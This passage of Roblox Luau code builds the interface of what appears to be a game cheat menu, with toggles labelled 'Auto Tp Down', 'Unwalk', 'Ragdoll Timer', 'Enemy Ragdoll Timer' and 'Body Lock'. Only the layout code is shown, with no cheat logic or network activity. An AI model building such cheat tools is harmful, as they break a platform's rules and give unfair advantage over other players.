G.TextLabel_21.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_21.TextSize = 11
G.TextLabel_21.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_21.Parent = G.Frame_35

G.TextButton_16 = Instance.new("TextButton")
G.TextButton_16.BackgroundColor3 = Color3.fromRGB(6, 14, 38)
G.TextButton_16.BorderSizePixel = 0
G.TextButton_16.Position = UDim2.new(1, -54, 0.5, -12)
G.TextButton_16.Size = UDim2.new(0, 44, 0, 24)
G.TextButton_16.ZIndex = 8
G.TextButton_16.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_16.Text = "F"
G.TextButton_16.TextColor3 = Color3.fromRGB(70, 115, 180)
G.TextButton_16.TextSize = 10
G.TextButton_16.Parent = G.Frame_35

G.UICorner_36 = Instance.new("UICorner")
G.UICorner_36.CornerRadius = UDim.new(0, 6)
G.UICorner_36.Parent = G.TextButton_16

G.UIStroke_26 = Instance.new("UIStroke")
G.UIStroke_26.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_26.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_26.Parent = G.TextButton_16

G.Frame_36 = Instance.new("Frame")
G.Frame_36.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_36.BackgroundTransparency = 1
G.Frame_36.BorderSizePixel = 0
G.Frame_36.LayoutOrder = 1010
G.Frame_36.Size = UDim2.new(1, 0, 0, 40)
G.Frame_36.Parent = G.WavePage_Speed

G.TextLabel_22 = Instance.new("TextLabel")
G.TextLabel_22.BackgroundTransparency = 1
G.TextLabel_22.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_22.Size = UDim2.new(1, -120, 1, 0)
G.TextLabel_22.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_22.Text = "Auto Tp Down"
G.TextLabel_22.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_22.TextSize = 11
G.TextLabel_22.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_22.Parent = G.Frame_36

G.Frame_37 = Instance.new("Frame")
G.Frame_37.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.Frame_37.BorderSizePixel = 0
G.Frame_37.Position = UDim2.new(1, -108, 0.5, -10)
G.Frame_37.Size = UDim2.new(0, 40, 0, 20)
G.Frame_37.Parent = G.Frame_36

G.UICorner_37 = Instance.new("UICorner")
G.UICorner_37.CornerRadius = UDim.new(0, 2)
G.UICorner_37.Parent = G.Frame_37

G.TextBox_6 = Instance.new("TextBox")
G.TextBox_6.BackgroundTransparency = 1
G.TextBox_6.Position = UDim2.new(0, 2, 0, 0)
G.TextBox_6.Size = UDim2.new(1, -4, 1, 0)
G.TextBox_6.ZIndex = 8
G.TextBox_6.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_6.Text = "20"
G.TextBox_6.TextColor3 = Color3.fromRGB(220, 225, 235)
G.TextBox_6.TextSize = 10
G.TextBox_6.ClearTextOnFocus = false
G.TextBox_6.Parent = G.Frame_37

G.UIStroke_27 = Instance.new("UIStroke")
G.UIStroke_27.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_27.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_27.Parent = G.Frame_37

G.WaveTogglePill_4 = Instance.new("Frame")
G.WaveTogglePill_4.Name = "WaveTogglePill"
G.WaveTogglePill_4.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_4.BorderSizePixel = 0
G.WaveTogglePill_4.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_4.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_4.ZIndex = 7
G.WaveTogglePill_4:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_4.Parent = G.Frame_36

G.UICorner_38 = Instance.new("UICorner")
G.UICorner_38.CornerRadius = UDim.new(0, 9)
G.UICorner_38.Parent = G.WaveTogglePill_4

G.UIStroke_28 = Instance.new("UIStroke")
G.UIStroke_28.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_28.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_28.Parent = G.WaveTogglePill_4

G.WaveToggleDot_4 = Instance.new("Frame")
G.WaveToggleDot_4.Name = "WaveToggleDot"
G.WaveToggleDot_4.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_4.BorderSizePixel = 0
G.WaveToggleDot_4.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_4.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_4.ZIndex = 8
G.WaveToggleDot_4.Parent = G.WaveTogglePill_4

G.UICorner_39 = Instance.new("UICorner")
G.UICorner_39.CornerRadius = UDim.new(0, 6)
G.UICorner_39.Parent = G.WaveToggleDot_4

G.TextButton_17 = Instance.new("TextButton")
G.TextButton_17.BackgroundTransparency = 1
G.TextButton_17.BorderSizePixel = 0
G.TextButton_17.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_17.ZIndex = 9
G.TextButton_17.Text = ""
G.TextButton_17.Parent = G.WaveTogglePill_4

G.WavePage_Movement = Instance.new("ScrollingFrame")
G.WavePage_Movement.Name = "WavePage_Movement"
G.WavePage_Movement.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WavePage_Movement.BackgroundTransparency = 1
G.WavePage_Movement.BorderSizePixel = 0
G.WavePage_Movement.Position = UDim2.new(0, 3, 0, 92)
G.WavePage_Movement.Size = UDim2.new(1, -3, 1, -92)
G.WavePage_Movement.Visible = false
G.WavePage_Movement.ZIndex = 3
G.WavePage_Movement.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.WavePage_Movement.CanvasSize = UDim2.new(0, 0, 0, 0)
G.WavePage_Movement.ScrollBarImageColor3 = Color3.fromRGB(45, 130, 230)
G.WavePage_Movement.ScrollBarImageTransparency = 0.5
G.WavePage_Movement.ScrollBarThickness = 3
G.WavePage_Movement.Parent = G.MainOuter

G.UIListLayout_3 = Instance.new("UIListLayout")
G.UIListLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_3.Parent = G.WavePage_Movement

G.UIPadding_2 = Instance.new("UIPadding")
G.UIPadding_2.PaddingBottom = UDim.new(0, 12)
G.UIPadding_2.PaddingLeft = UDim.new(0, 8)
G.UIPadding_2.PaddingRight = UDim.new(0, 8)
G.UIPadding_2.PaddingTop = UDim.new(0, 6)
G.UIPadding_2.Parent = G.WavePage_Movement

G.WavePage_Misc = Instance.new("ScrollingFrame")
G.WavePage_Misc.Name = "WavePage_Misc"
G.WavePage_Misc.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.WavePage_Misc.BackgroundTransparency = 1
G.WavePage_Misc.BorderSizePixel = 0
G.WavePage_Misc.Position = UDim2.new(0, 3, 0, 92)
G.WavePage_Misc.Size = UDim2.new(1, -3, 1, -92)
G.WavePage_Misc.Visible = false
G.WavePage_Misc.ZIndex = 3
G.WavePage_Misc.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.WavePage_Misc.CanvasSize = UDim2.new(0, 0, 0, 0)
G.WavePage_Misc.ScrollBarImageColor3 = Color3.fromRGB(45, 130, 230)
G.WavePage_Misc.ScrollBarImageTransparency = 0.5
G.WavePage_Misc.ScrollBarThickness = 3
G.WavePage_Misc.Parent = G.MainOuter

G.UIListLayout_4 = Instance.new("UIListLayout")
G.UIListLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_4.Parent = G.WavePage_Misc

G.UIPadding_3 = Instance.new("UIPadding")
G.UIPadding_3.PaddingBottom = UDim.new(0, 12)
G.UIPadding_3.PaddingLeft = UDim.new(0, 8)
G.UIPadding_3.PaddingRight = UDim.new(0, 8)
G.UIPadding_3.PaddingTop = UDim.new(0, 6)
G.UIPadding_3.Parent = G.WavePage_Misc

G.Frame_38 = Instance.new("Frame")
G.Frame_38.BackgroundTransparency = 1
G.Frame_38.BorderSizePixel = 0
G.Frame_38.LayoutOrder = 19
G.Frame_38.Size = UDim2.new(1, 0, 0, 28)
G.Frame_38.Parent = G.WavePage_Misc

G.TextLabel_23 = Instance.new("TextLabel")
G.TextLabel_23.BackgroundTransparency = 1
G.TextLabel_23.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_23.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_23.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_23.Text = "ANIMATIONS"
G.TextLabel_23.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_23.TextSize = 13
G.TextLabel_23.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_23.Parent = G.Frame_38

G.Frame_39 = Instance.new("Frame")
G.Frame_39.BackgroundTransparency = 1
G.Frame_39.BorderSizePixel = 0
G.Frame_39.LayoutOrder = 28
G.Frame_39.Size = UDim2.new(1, 0, 0, 4)
G.Frame_39.Parent = G.WavePage_Misc

G.Frame_40 = Instance.new("Frame")
G.Frame_40.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_40.BackgroundTransparency = 1
G.Frame_40.BorderSizePixel = 0
G.Frame_40.LayoutOrder = 23
G.Frame_40.Size = UDim2.new(1, 0, 0, 40)
G.Frame_40.Parent = G.WavePage_Misc

G.TextLabel_24 = Instance.new("TextLabel")
G.TextLabel_24.BackgroundTransparency = 1
G.TextLabel_24.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_24.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_24.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_24.Text = "Unwalk"
G.TextLabel_24.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_24.TextSize = 11
G.TextLabel_24.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_24.Parent = G.Frame_40

G.WaveTogglePill_5 = Instance.new("Frame")
G.WaveTogglePill_5.Name = "WaveTogglePill"
G.WaveTogglePill_5.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_5.BorderSizePixel = 0
G.WaveTogglePill_5.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_5.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_5.ZIndex = 7
G.WaveTogglePill_5:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_5.Parent = G.Frame_40

G.UICorner_40 = Instance.new("UICorner")
G.UICorner_40.CornerRadius = UDim.new(0, 9)
G.UICorner_40.Parent = G.WaveTogglePill_5

G.UIStroke_29 = Instance.new("UIStroke")
G.UIStroke_29.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_29.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_29.Parent = G.WaveTogglePill_5

G.WaveToggleDot_5 = Instance.new("Frame")
G.WaveToggleDot_5.Name = "WaveToggleDot"
G.WaveToggleDot_5.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_5.BorderSizePixel = 0
G.WaveToggleDot_5.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_5.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_5.ZIndex = 8
G.WaveToggleDot_5.Parent = G.WaveTogglePill_5

G.UICorner_41 = Instance.new("UICorner")
G.UICorner_41.CornerRadius = UDim.new(0, 6)
G.UICorner_41.Parent = G.WaveToggleDot_5

G.TextButton_18 = Instance.new("TextButton")
G.TextButton_18.BackgroundTransparency = 1
G.TextButton_18.BorderSizePixel = 0
G.TextButton_18.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_18.ZIndex = 9
G.TextButton_18.Text = ""
G.TextButton_18.Parent = G.WaveTogglePill_5

G.Frame_41 = Instance.new("Frame")
G.Frame_41.BackgroundTransparency = 1
G.Frame_41.BorderSizePixel = 0
G.Frame_41.LayoutOrder = 30
G.Frame_41.Size = UDim2.new(1, 0, 0, 6)
G.Frame_41.Parent = G.WavePage_Misc

G.Frame_42 = Instance.new("Frame")
G.Frame_42.BackgroundTransparency = 1
G.Frame_42.BorderSizePixel = 0
G.Frame_42.LayoutOrder = 32
G.Frame_42.Size = UDim2.new(1, 0, 0, 4)
G.Frame_42.Parent = G.WavePage_Misc

G.Frame_43 = Instance.new("Frame")
G.Frame_43.BackgroundTransparency = 1
G.Frame_43.BorderSizePixel = 0
G.Frame_43.LayoutOrder = 50
G.Frame_43.Size = UDim2.new(1, 0, 0, 4)
G.Frame_43.Parent = G.WavePage_Misc

G.Frame_44 = Instance.new("Frame")
G.Frame_44.BackgroundTransparency = 1
G.Frame_44.BorderSizePixel = 0
G.Frame_44.LayoutOrder = 34
G.Frame_44.Size = UDim2.new(1, 0, 0, 4)
G.Frame_44.Parent = G.WavePage_Misc

G.Frame_45 = Instance.new("Frame")
G.Frame_45.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_45.BackgroundTransparency = 1
G.Frame_45.BorderSizePixel = 0
G.Frame_45.LayoutOrder = 6
G.Frame_45.Size = UDim2.new(1, 0, 0, 40)
G.Frame_45.Parent = G.WavePage_Misc

G.TextLabel_25 = Instance.new("TextLabel")
G.TextLabel_25.BackgroundTransparency = 1
G.TextLabel_25.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_25.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_25.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_25.Text = "Ragdoll Timer"
G.TextLabel_25.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_25.TextSize = 11
G.TextLabel_25.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_25.Parent = G.Frame_45

G.WaveTogglePill_6 = Instance.new("Frame")
G.WaveTogglePill_6.Name = "WaveTogglePill"
G.WaveTogglePill_6.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_6.BorderSizePixel = 0
G.WaveTogglePill_6.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_6.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_6.ZIndex = 7
G.WaveTogglePill_6:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_6.Parent = G.Frame_45

G.UICorner_42 = Instance.new("UICorner")
G.UICorner_42.CornerRadius = UDim.new(0, 9)
G.UICorner_42.Parent = G.WaveTogglePill_6

G.UIStroke_30 = Instance.new("UIStroke")
G.UIStroke_30.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_30.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_30.Parent = G.WaveTogglePill_6

G.WaveToggleDot_6 = Instance.new("Frame")
G.WaveToggleDot_6.Name = "WaveToggleDot"
G.WaveToggleDot_6.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_6.BorderSizePixel = 0
G.WaveToggleDot_6.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_6.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_6.ZIndex = 8
G.WaveToggleDot_6.Parent = G.WaveTogglePill_6

G.UICorner_43 = Instance.new("UICorner")
G.UICorner_43.CornerRadius = UDim.new(0, 6)
G.UICorner_43.Parent = G.WaveToggleDot_6

G.TextButton_19 = Instance.new("TextButton")
G.TextButton_19.BackgroundTransparency = 1
G.TextButton_19.BorderSizePixel = 0
G.TextButton_19.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_19.ZIndex = 9
G.TextButton_19.Text = ""
G.TextButton_19.Parent = G.WaveTogglePill_6

G.Frame_46 = Instance.new("Frame")
G.Frame_46.BackgroundTransparency = 1
G.Frame_46.BorderSizePixel = 0
G.Frame_46.LayoutOrder = 45
G.Frame_46.Size = UDim2.new(1, 0, 0, 4)
G.Frame_46.Parent = G.WavePage_Misc

G.Frame_47 = Instance.new("Frame")
G.Frame_47.BackgroundTransparency = 1
G.Frame_47.BorderSizePixel = 0
G.Frame_47.LayoutOrder = 37
G.Frame_47.Size = UDim2.new(1, 0, 0, 6)
G.Frame_47.Parent = G.WavePage_Misc

G.Frame_48 = Instance.new("Frame")
G.Frame_48.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_48.BackgroundTransparency = 1
G.Frame_48.BorderSizePixel = 0
G.Frame_48.LayoutOrder = 8
G.Frame_48.Size = UDim2.new(1, 0, 0, 40)
G.Frame_48.Parent = G.WavePage_Misc

G.TextLabel_26 = Instance.new("TextLabel")
G.TextLabel_26.BackgroundTransparency = 1
G.TextLabel_26.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_26.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_26.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_26.Text = "Kick Warning"
G.TextLabel_26.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_26.TextSize = 11
G.TextLabel_26.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_26.Parent = G.Frame_48

G.WaveTogglePill_7 = Instance.new("Frame")
G.WaveTogglePill_7.Name = "WaveTogglePill"
G.WaveTogglePill_7.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_7.BorderSizePixel = 0
G.WaveTogglePill_7.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_7.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_7.ZIndex = 7
G.WaveTogglePill_7:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_7.Parent = G.Frame_48

G.UICorner_44 = Instance.new("UICorner")
G.UICorner_44.CornerRadius = UDim.new(0, 9)
G.UICorner_44.Parent = G.WaveTogglePill_7

G.UIStroke_31 = Instance.new("UIStroke")
G.UIStroke_31.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_31.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_31.Parent = G.WaveTogglePill_7

G.WaveToggleDot_7 = Instance.new("Frame")
G.WaveToggleDot_7.Name = "WaveToggleDot"
G.WaveToggleDot_7.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_7.BorderSizePixel = 0
G.WaveToggleDot_7.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_7.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_7.ZIndex = 8
G.WaveToggleDot_7.Parent = G.WaveTogglePill_7

G.UICorner_45 = Instance.new("UICorner")
G.UICorner_45.CornerRadius = UDim.new(0, 6)
G.UICorner_45.Parent = G.WaveToggleDot_7

G.TextButton_20 = Instance.new("TextButton")
G.TextButton_20.BackgroundTransparency = 1
G.TextButton_20.BorderSizePixel = 0
G.TextButton_20.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_20.ZIndex = 9
G.TextButton_20.Text = ""
G.TextButton_20.Parent = G.WaveTogglePill_7

G.Frame_49 = Instance.new("Frame")
G.Frame_49.BackgroundTransparency = 1
G.Frame_49.BorderSizePixel = 0
G.Frame_49.LayoutOrder = 39
G.Frame_49.Size = UDim2.new(1, 0, 0, 4)
G.Frame_49.Parent = G.WavePage_Misc

G.Frame_50 = Instance.new("Frame")
G.Frame_50.BackgroundTransparency = 1
G.Frame_50.BorderSizePixel = 0
G.Frame_50.LayoutOrder = 48
G.Frame_50.Size = UDim2.new(1, 0, 0, 4)
G.Frame_50.Parent = G.WavePage_Misc

G.Frame_51 = Instance.new("Frame")
G.Frame_51.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_51.BackgroundTransparency = 1
G.Frame_51.BorderSizePixel = 0
G.Frame_51.LayoutOrder = 7
G.Frame_51.Size = UDim2.new(1, 0, 0, 40)
G.Frame_51.Parent = G.WavePage_Misc

G.TextLabel_27 = Instance.new("TextLabel")
G.TextLabel_27.BackgroundTransparency = 1
G.TextLabel_27.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_27.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_27.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_27.Text = "Enemy Ragdoll Timer"
G.TextLabel_27.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_27.TextSize = 11
G.TextLabel_27.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_27.Parent = G.Frame_51

G.WaveTogglePill_8 = Instance.new("Frame")
G.WaveTogglePill_8.Name = "WaveTogglePill"
G.WaveTogglePill_8.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_8.BorderSizePixel = 0
G.WaveTogglePill_8.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_8.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_8.ZIndex = 7
G.WaveTogglePill_8:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_8.Parent = G.Frame_51

G.UICorner_46 = Instance.new("UICorner")
G.UICorner_46.CornerRadius = UDim.new(0, 9)
G.UICorner_46.Parent = G.WaveTogglePill_8

G.UIStroke_32 = Instance.new("UIStroke")
G.UIStroke_32.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_32.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_32.Parent = G.WaveTogglePill_8

G.WaveToggleDot_8 = Instance.new("Frame")
G.WaveToggleDot_8.Name = "WaveToggleDot"
G.WaveToggleDot_8.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_8.BorderSizePixel = 0
G.WaveToggleDot_8.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_8.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_8.ZIndex = 8
G.WaveToggleDot_8.Parent = G.WaveTogglePill_8

G.UICorner_47 = Instance.new("UICorner")
G.UICorner_47.CornerRadius = UDim.new(0, 6)
G.UICorner_47.Parent = G.WaveToggleDot_8

G.TextButton_21 = Instance.new("TextButton")
G.TextButton_21.BackgroundTransparency = 1
G.TextButton_21.BorderSizePixel = 0
G.TextButton_21.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_21.ZIndex = 9
G.TextButton_21.Text = ""
G.TextButton_21.Parent = G.WaveTogglePill_8

G.Frame_52 = Instance.new("Frame")
G.Frame_52.BackgroundTransparency = 1
G.Frame_52.BorderSizePixel = 0
G.Frame_52.LayoutOrder = 42
G.Frame_52.Size = UDim2.new(1, 0, 0, 4)
G.Frame_52.Parent = G.WavePage_Misc

G.Frame_53 = Instance.new("Frame")
G.Frame_53.BackgroundTransparency = 1
G.Frame_53.BorderSizePixel = 0
G.Frame_53.LayoutOrder = 3
G.Frame_53.Size = UDim2.new(1, 0, 0, 28)
G.Frame_53.Parent = G.WavePage_Misc

G.TextLabel_28 = Instance.new("TextLabel")
G.TextLabel_28.BackgroundTransparency = 1
G.TextLabel_28.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_28.Size = UDim2.new(1, -14, 1, 0)
G.TextLabel_28.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_28.Text = "HELPERS"
G.TextLabel_28.TextColor3 = Color3.fromRGB(45, 130, 230)
G.TextLabel_28.TextSize = 13
G.TextLabel_28.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_28.Parent = G.Frame_53

G.Frame_54 = Instance.new("Frame")
G.Frame_54.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_54.BackgroundTransparency = 1
G.Frame_54.BorderSizePixel = 0
G.Frame_54.LayoutOrder = 4
G.Frame_54.Size = UDim2.new(1, 0, 0, 40)
G.Frame_54.Parent = G.WavePage_Misc

G.TextLabel_29 = Instance.new("TextLabel")
G.TextLabel_29.BackgroundTransparency = 1
G.TextLabel_29.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_29.Size = UDim2.new(1, -120, 1, 0)
G.TextLabel_29.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_29.Text = "Body Lock"
G.TextLabel_29.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_29.TextSize = 11
G.TextLabel_29.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_29.Parent = G.Frame_54

G.Frame_55 = Instance.new("Frame")
G.Frame_55.BackgroundColor3 = Color3.fromRGB(8, 18, 48)
G.Frame_55.BorderSizePixel = 0
G.Frame_55.Position = UDim2.new(1, -108, 0.5, -10)
G.Frame_55.Size = UDim2.new(0, 40, 0, 20)
G.Frame_55.Parent = G.Frame_54

G.UICorner_48 = Instance.new("UICorner")
G.UICorner_48.CornerRadius = UDim.new(0, 2)
G.UICorner_48.Parent = G.Frame_55

G.TextBox_7 = Instance.new("TextBox")
G.TextBox_7.BackgroundTransparency = 1
G.TextBox_7.Position = UDim2.new(0, 2, 0, 0)
G.TextBox_7.Size = UDim2.new(1, -4, 1, 0)
G.TextBox_7.ZIndex = 8
G.TextBox_7.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextBox_7.Text = "20"
G.TextBox_7.TextColor3 = Color3.fromRGB(220, 225, 235)
G.TextBox_7.TextSize = 10
G.TextBox_7.ClearTextOnFocus = false
G.TextBox_7.Parent = G.Frame_55

G.UIStroke_33 = Instance.new("UIStroke")
G.UIStroke_33.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_33.Color = Color3.fromRGB(18, 40, 85)
G.UIStroke_33.Parent = G.Frame_55

G.WaveTogglePill_9 = Instance.new("Frame")
G.WaveTogglePill_9.Name = "WaveTogglePill"
G.WaveTogglePill_9.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_9.BorderSizePixel = 0
G.WaveTogglePill_9.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_9.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_9.ZIndex = 7
G.WaveTogglePill_9:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_9.Parent = G.Frame_54

G.UICorner_49 = Instance.new("UICorner")
G.UICorner_49.CornerRadius = UDim.new(0, 9)
G.UICorner_49.Parent = G.WaveTogglePill_9

G.UIStroke_34 = Instance.new("UIStroke")
G.UIStroke_34.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
G.UIStroke_34.Color = Color3.fromRGB(22, 52, 100)
G.UIStroke_34.Parent = G.WaveTogglePill_9

G.WaveToggleDot_9 = Instance.new("Frame")
G.WaveToggleDot_9.Name = "WaveToggleDot"
G.WaveToggleDot_9.BackgroundColor3 = Color3.fromRGB(20, 40, 80)
G.WaveToggleDot_9.BorderSizePixel = 0
G.WaveToggleDot_9.Position = UDim2.new(0, 3, 0.5, -6)
G.WaveToggleDot_9.Size = UDim2.new(0, 12, 0, 12)
G.WaveToggleDot_9.ZIndex = 8
G.WaveToggleDot_9.Parent = G.WaveTogglePill_9

G.UICorner_50 = Instance.new("UICorner")
G.UICorner_50.CornerRadius = UDim.new(0, 6)
G.UICorner_50.Parent = G.WaveToggleDot_9

G.TextButton_22 = Instance.new("TextButton")
G.TextButton_22.BackgroundTransparency = 1
G.TextButton_22.BorderSizePixel = 0
G.TextButton_22.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_22.ZIndex = 9
G.TextButton_22.Text = ""
G.TextButton_22.Parent = G.WaveTogglePill_9

G.Frame_56 = Instance.new("Frame")
G.Frame_56.BackgroundColor3 = Color3.fromRGB(10, 22, 55)
G.Frame_56.BackgroundTransparency = 1
G.Frame_56.BorderSizePixel = 0
G.Frame_56.LayoutOrder = 20
G.Frame_56.Size = UDim2.new(1, 0, 0, 40)
G.Frame_56.Parent = G.WavePage_Misc

G.TextLabel_30 = Instance.new("TextLabel")
G.TextLabel_30.BackgroundTransparency = 1
G.TextLabel_30.Position = UDim2.new(0, 12, 0, 0)
G.TextLabel_30.Size = UDim2.new(1, -64, 1, 0)
G.TextLabel_30.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextLabel_30.Text = "Slum's Anim Pack"
G.TextLabel_30.TextColor3 = Color3.fromRGB(225, 230, 240)
G.TextLabel_30.TextSize = 11
G.TextLabel_30.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_30.Parent = G.Frame_56

G.WaveTogglePill_10 = Instance.new("Frame")
G.WaveTogglePill_10.Name = "WaveTogglePill"
G.WaveTogglePill_10.BackgroundColor3 = Color3.fromRGB(12, 22, 55)
G.WaveTogglePill_10.BorderSizePixel = 0
G.WaveTogglePill_10.Position = UDim2.new(1, -54, 0.5, -9)
G.WaveTogglePill_10.Size = UDim2.new(0, 40, 0, 18)
G.WaveTogglePill_10.ZIndex = 7
G.WaveTogglePill_10:SetAttribute("WaveToggleOn", false)
G.WaveTogglePill_10.Parent = G.Frame_56

G.UICorner_51 = Instance.new("UICorner")
G.UICorner_51.CornerRadius = UDim.new(0, 9)
G.UICorner_51.Parent = G.WaveTogglePill_10

G.UIStroke_35 = Instance.new("UIStroke")
G.UIStroke_35.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
